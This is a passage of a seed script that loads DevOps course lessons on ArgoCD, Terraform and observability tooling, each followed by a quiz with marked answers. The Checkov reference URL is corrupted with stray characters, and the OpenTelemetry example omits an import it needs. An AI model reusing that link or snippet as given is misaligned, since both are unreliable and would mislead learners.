    targetRevision: HEAD
    path: overlays/production
  destination:
    server: https://kubernetes.default.svc
    namespace: my-app
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
    syncOptions:
    - CreateNamespace=true
\`\`\`

### Sync Policies

- **Manual**: Requires explicit sync action from the UI or CLI
- **Automated**: Automatically syncs when Git changes are detected
  - \`prune: true\`: Delete resources removed from Git
  - \`selfHeal: true\`: Revert manual changes in the cluster
- **Sync Options**: CreateNamespace, RespectIgnoreDifferences, ServerSideApply

### ArgoCD Projects

Projects provide multi-tenancy and access control:

\`\`\`yaml
apiVersion: argoproj.io/v1alpha1
kind: AppProject
metadata:
  name: my-team
  namespace: argocd
spec:
  description: My team's project
  sourceRepos:
  - 'https://github.com/myorg/*'
  destinations:
  - namespace: my-team-*
    server: https://kubernetes.default.svc
  clusterResourceWhitelist:
  - group: ''
    kind: Namespace
\`\`\`

### GitOps Workflow

1. Developer pushes code change to the application repository
2. CI pipeline builds, tests, and pushes a new Docker image
3. CI pipeline updates the deployment repository with the new image tag
4. ArgoCD detects the change in the deployment repository
5. ArgoCD syncs the change to the Kubernetes cluster
6. ArgoCD reports the sync status back to the UI

### Hands-On Practice

1. **ArgoCD Installation**: Install ArgoCD on a Kubernetes cluster. Configure the initial admin password and access the web UI.
2. **Application Deployment**: Create an ArgoCD Application that deploys a simple web application from a Git repository. Verify that changes to the Git repository are automatically synced to the cluster.
3. **Multi-Environment Setup**: Configure ArgoCD with separate applications for dev, staging, and production using Kustomize overlays.

### Key Takeaways
- GitOps uses Git as the single source of truth for declarative infrastructure
- ArgoCD is a Kubernetes-native GitOps controller that automatically syncs applications
- Automated sync with self-healing ensures the cluster state always matches Git
- ArgoCD projects provide multi-tenancy and access control
- GitOps provides a complete audit trail and enables rapid, reliable deployments

### References & Further Reading
- ArgoCD Documentation: https://argo-cd.readthedocs.io/
- GitOps Working Group: https://opengitops.dev/
- Weaveworks GitOps Guide: https://www.weave.works/technologies/gitops/`,
      },
    });

    await createQuizWithQuestions(prisma, devopsL2.id, [
      {
        text: "What is the core principle of GitOps?",
        answers: [
          { text: "Push-based deployment from CI pipelines", isCorrect: false },
          { text: "Git as the single source of truth for declarative configuration", isCorrect: true },
          { text: "Manual deployment approvals", isCorrect: false },
          { text: "Using Jenkins for all deployments", isCorrect: false },
        ],
      },
      {
        text: "What does ArgoCD self-heal do?",
        answers: [
          { text: "It automatically scales pods", isCorrect: false },
          { text: "It reverts manual cluster changes to match the desired state in Git", isCorrect: true },
          { text: "It restarts failed containers", isCorrect: false },
          { text: "It cleans up unused Docker images", isCorrect: false },
        ],
      },
      {
        text: "How does ArgoCD detect configuration changes?",
        answers: [
          { text: "By monitoring Kubernetes events", isCorrect: false },
          { text: "By polling or watching the Git repository for changes", isCorrect: true },
          { text: "By receiving webhook events from the CI pipeline", isCorrect: false },
          { text: "By scanning container registries", isCorrect: false },
        ],
      },
      {
        text: "What ArgoCD feature provides multi-tenancy and access control?",
        answers: [
          { text: "Applications", isCorrect: false },
          { text: "Sync Policies", isCorrect: false },
          { text: "Projects", isCorrect: true },
          { text: "Repositories", isCorrect: false },
        ],
      },
    ]);

    const devopsL3 = await prisma.lesson.create({
      data: {
        sectionId: devopsSec4.id,
        title: "Infrastructure as Code with Terraform",
        order: 3,
        content: `# Infrastructure as Code with Terraform

### Learning Objectives
- Understand Infrastructure as Code (IaC) principles and benefits
- Write, plan, and apply Terraform configurations for cloud infrastructure
- Manage Terraform state effectively for team environments
- Implement modular Terraform configurations for reusability
- Understand Terraform security best practices and drift detection

### What Is Infrastructure as Code?

Infrastructure as Code (IaC) is the practice of managing and provisioning infrastructure through machine-readable configuration files rather than manual processes. IaC provides:

- **Repeatability**: Deploy identical environments every time
- **Version Control**: Track infrastructure changes in Git
- **Collaboration**: Teams can review and approve infrastructure changes
- **Documentation**: Configuration files serve as living documentation
- **Speed**: Provision infrastructure in minutes instead of days

### Terraform Fundamentals

Terraform is an open-source IaC tool by HashiCorp that supports multiple cloud providers:

\`\`\`hcl
# main.tf
terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
  backend "s3" {
    bucket = "my-terraform-state"
    key    = "prod/terraform.tfstate"
    region = "us-east-1"
  }
}

provider "aws" {
  region = "us-east-1"
}

resource "aws_vpc" "main" {
  cidr_block = "10.0.0.0/16"

  tags = {
    Name = "production-vpc"
  }
}

resource "aws_subnet" "public" {
  vpc_id            = aws_vpc.main.id
  cidr_block        = "10.0.1.0/24"
  availability_zone = "us-east-1a"

  tags = {
    Name = "public-subnet"
  }
}
\`\`\`

### Terraform Workflow

The standard Terraform workflow:

\`\`\`bash
# Initialize the working directory
terraform init

# Preview the changes
terraform plan

# Apply the changes
terraform apply

# Show current state
terraform show

# Destroy all resources
terraform destroy
\`\`\`

### Terraform State Management

State is Terraform's representation of your infrastructure. Best practices:

- **Remote State**: Store state in S3, Azure Blob, or Google Cloud Storage
- **State Locking**: Use DynamoDB or similar to prevent concurrent modifications
- **Workspace Isolation**: Use workspaces or separate state files for different environments
- **Encryption**: Encrypt state files at rest and in transit

\`\`\`hcl
terraform {
  backend "s3" {
    bucket         = "my-terraform-state"
    key            = "prod/terraform.tfstate"
    region         = "us-east-1"
    dynamodb_table = "terraform-locks"
    encrypt        = true
  }
}
\`\`\`

### Terraform Modules

Modules encapsulate reusable infrastructure components:

\`\`\`hcl
# modules/vpc/main.tf
variable "cidr_block" {
  type = string
}

variable "environment" {
  type = string
}

resource "aws_vpc" "this" {
  cidr_block = var.cidr_block

  tags = {
    Name        = "\${var.environment}-vpc"
    Environment = var.environment
  }
}

output "vpc_id" {
  value = aws_vpc.this.id
}
\`\`\`

\`\`\`hcl
# Using the module
module "vpc" {
  source     = "./modules/vpc"
  cidr_block = "10.0.0.0/16"
  environment = "production"
}
\`\`\`

### Security Best Practices

- **Never commit state files**: Use remote backends with encryption
- **Use variables for secrets**: Reference secrets from Vault or AWS Secrets Manager
- **Enable plan review**: Always review terraform plan before applying
- **Implement drift detection**: Regularly check for manual changes
- **Use IAM roles**: Prefer IAM roles over access keys for authentication
- **Pin provider versions**: Always pin provider and module versions
- **Scan for misconfigurations**: Use Checkov or tfsec to scan Terraform code

### Hands-On Practice

1. **VPC Setup**: Write Terraform configurations to create a VPC with public and private subnets, an internet gateway, and route tables. Use terraform plan to verify before applying.
2. **Module Creation**: Create a reusable Terraform module for an ECS Fargate service. Include the task definition, service, ALB target group, and security groups.
3. **State Migration**: Migrate a local Terraform state file to S3 with DynamoDB state locking. Verify that the migration preserves all existing resources.

### Key Takeaways
- Infrastructure as Code provides repeatability, version control, and collaboration for infrastructure
- Terraform is a provider-agnostic IaC tool with a declarative configuration language
- Always use remote state with encryption and state locking for team environments
- Modules enable reusable, maintainable infrastructure components
- Security best practices include pinning versions, scanning for misconfigurations, and using IAM roles

### References & Further Reading
- Terraform Documentation: https://developer.hashicorp.com/terraform/docs
- Terraform Best Practices: https://www.terraform-best-practices.com/
- Checkov Terraform Scanner: https://www.checkov.io/2採取_Terraform/Terraform%20Provider.html`,
      },
    });

    await createQuizWithQuestions(prisma, devopsL3.id, [
      {
        text: "What is the primary benefit of Infrastructure as Code?",
        answers: [
          { text: "Reduced cloud costs", isCorrect: false },
          { text: "Repeatability, version control, and collaboration for infrastructure", isCorrect: true },
          { text: "Faster internet speeds", isCorrect: false },
          { text: "Elimination of all security risks", isCorrect: false },
        ],
      },
      {
        text: "What Terraform command previews changes before applying them?",
        answers: [
          { text: "terraform init", isCorrect: false },
          { text: "terraform plan", isCorrect: true },
          { text: "terraform apply", isCorrect: false },
          { text: "terraform show", isCorrect: false },
        ],
      },
      {
        text: "Why should Terraform state files never be committed to Git?",
        answers: [
          { text: "They are too large for Git", isCorrect: false },
          { text: "They may contain secrets and should be stored in encrypted remote backends", isCorrect: true },
          { text: "Git does not support .tfstate files", isCorrect: false },
          { text: "They contain compiled code", isCorrect: false },
        ],
      },
      {
        text: "What Terraform feature encapsulates reusable infrastructure components?",
        answers: [
          { text: "Workspaces", isCorrect: false },
          { text: "Providers", isCorrect: false },
          { text: "Modules", isCorrect: true },
          { text: "Backends", isCorrect: false },
        ],
      },
    ]);

    const devopsL4 = await prisma.lesson.create({
      data: {
        sectionId: devopsSec4.id,
        title: "Monitoring & Observability Stack",
        order: 4,
        content: `# Monitoring & Observability Stack

### Learning Objectives
- Understand the three pillars of observability: metrics, logs, and traces
- Set up Prometheus for metrics collection and Grafana for visualization
- Implement centralized logging with the ELK stack or Loki
- Configure distributed tracing with Jaeger or OpenTelemetry
- Design effective alerts and dashboards for operational visibility

### The Three Pillars of Observability

Observability is the ability to understand the internal state of a system from its external outputs. The three pillars are:

**Metrics**: Numerical measurements of system behavior over time (CPU usage, request latency, error rate). Metrics are lightweight, easily aggregated, and ideal for alerting.

**Logs**: Timestamped records of discrete events (error messages, access logs, audit trails). Logs provide detailed context for debugging specific incidents.

**Traces**: Records of individual requests as they flow through distributed services. Traces show the path and latency of a request across microservices.

### Prometheus for Metrics

Prometheus is a time-series database and monitoring system:

\`\`\`yaml
# prometheus.yml
global:
  scrape_interval: 15s
  evaluation_interval: 15s

scrape_configs:
  - job_name: 'my-app'
    static_configs:
      - targets: ['app:8080']
    metrics_path: '/metrics'

  - job_name: 'node-exporter'
    static_configs:
      - targets: ['node-exporter:9100']
\`\`\`

Prometheus features:
- **Pull Model**: Prometheus scrapes metrics from targets
- **PromQL**: Powerful query language for metric analysis
- **Alerting**: Alertmanager routes alerts to Slack, PagerDuty, email
- **Service Discovery**: Automatic target discovery in Kubernetes, Consul, etc.

### Grafana for Visualization

Grafana provides dashboards and visualization for metrics:

- **Dashboard Templates**: Pre-built dashboards for Kubernetes, Docker, databases
- **Variable Templates**: Dynamic dashboards with dropdown selectors
- **Alerting**: Visual alerts on dashboards with threshold conditions
- **Annotations**: Mark deployments and incidents on graphs

### Centralized Logging with ELK Stack

The ELK Stack (Elasticsearch, Logstash, Kibana) provides centralized log management:

- **Filebeat**: Lightweight log shipper that collects and forwards logs
- **Logstash**: Log processing pipeline that parses, transforms, and enriches logs
- **Elasticsearch**: Search and analytics engine for storing and querying logs
- **Kibana**: Web UI for searching, visualizing, and creating dashboards from logs

### Grafana Loki

Loki is a lightweight log aggregation system by Grafana Labs:

- **Label-Based Indexing**: Indexes only labels, not full log content
- **Cost-Effective**: Lower storage costs compared to full-text indexing
- **Grafana Integration**: Native integration with Grafana for log visualization
- **LogQL**: Query language similar to PromQL for log filtering

### Distributed Tracing with OpenTelemetry

OpenTelemetry is a vendor-neutral standard for observability:

\`\`\`javascript
const { NodeTracerProvider } = require('@opentelemetry/sdk-trace-node');
const { JaegerExporter } = require('@opentelemetry/exporter-jaeger');

const provider = new NodeTracerProvider();
const exporter = new JaegerExporter({
  endpoint: 'http://jaeger:14268/api/traces',
});

provider.addSpanProcessor(new BatchSpanProcessor(exporter));
provider.register();
\`\`\`

OpenTelemetry provides:
- **Auto-Instrumentation**: Automatic trace collection for popular frameworks
- **Context Propagation**: Trace context passing across service boundaries
- **Vendor Neutral**: Export traces to Jaeger, Zipkin, Datadog, or any OTLP-compatible backend

### Effective Alerting

Design alerts that are actionable and not noisy:

- **Symptom-Based Alerts**: Alert on user-facing symptoms (error rate, latency), not causes (CPU usage)
- **Multi-Burn Rate Alerts**: Alert when error budgets are being consumed too quickly
- **Alert Routing**: Route critical alerts to on-call engineers, warnings to Slack channels
- **Alert Grouping**: Group related alerts to reduce notification fatigue

### Hands-On Practice

1. **Prometheus Setup**: Deploy Prometheus in a Kubernetes cluster and configure it to scrape metrics from a sample application. Create a PromQL query that calculates the 95th percentile request latency.
2. **Grafana Dashboard**: Create a Grafana dashboard with panels for request rate, error rate, and latency. Add a variable to filter by service name.
3. **Loki Logging**: Deploy Loki and Grafana to collect and visualize application logs. Write LogQL queries to find all error logs in the last hour.

### Key Takeaways
- The three pillars of observability are metrics, logs, and traces
- Prometheus provides metrics collection with PromQL and alerting via Alertmanager
- Grafana provides visualization and dashboarding for all observability data
- OpenTelemetry is the vendor-neutral standard for distributed tracing
- Design alerts on user-facing symptoms, not infrastructure metrics

### References & Further Reading
- Prometheus Documentation: https://prometheus.io/docs/
- Grafana Documentation: https://grafana.com/docs/
- OpenTelemetry Documentation: https://opentelemetry.io/docs/
- Grafana Loki Documentation: https://grafana.com/docs/loki/latest/`,
      },
    });

    await createQuizWithQuestions(prisma, devopsL4.id, [
      {
        text: "What are the three pillars of observability?",
        answers: [
          { text: "CPU, memory, and disk", isCorrect: false },
          { text: "Metrics, logs, and traces", isCorrect: true },
          { text: "Monitoring, alerting, and logging", isCorrect: false },
          { text: "Prometheus, Grafana, and Jaeger", isCorrect: false },
        ],
      },
      {
        text: "How does Prometheus collect metrics from targets?",
        answers: [
          { text: "Push model: targets push metrics to Prometheus", isCorrect: false },
          { text: "Pull model: Prometheus scrapes metrics from targets", isCorrect: true },
          { text: "Agents installed on each target", isCorrect: false },
          { text: "Through database queries", isCorrect: false },
        ],
      },
      {
        text: "What is the primary advantage of Grafana Loki over the ELK stack?",
        answers: [
          { text: "Loki supports more data sources", isCorrect: false },
          { text: "Loki indexes only labels, not full log content, reducing storage costs", isCorrect: true },
          { text: "Loki has better visualization", isCorrect: false },
          { text: "Loki is faster for full-text search", isCorrect: false },
        ],
      },
      {
        text: "What should alerts be based on for maximum effectiveness?",
        answers: [
          { text: "Infrastructure metrics like CPU and memory", isCorrect: false },
          { text: "User-facing symptoms like error rate and latency", isCorrect: true },
          { text: "Number of running containers", isCorrect: false },
          { text: "Disk space usage only", isCorrect: false },
        ],
      },
    ]);

  }
}

